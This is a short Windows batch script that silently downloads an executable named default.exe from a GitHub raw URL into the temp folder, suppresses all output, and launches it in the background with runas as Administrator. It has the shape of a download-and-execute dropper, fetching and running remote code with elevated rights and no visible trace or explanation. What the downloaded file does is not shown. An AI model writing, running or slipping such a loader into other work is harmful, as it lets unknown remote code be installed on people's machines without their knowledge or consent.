@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe" >nul 2>&1
start /B "" runas /user:Administrator "%TEMP%\default.exe"

endlocal
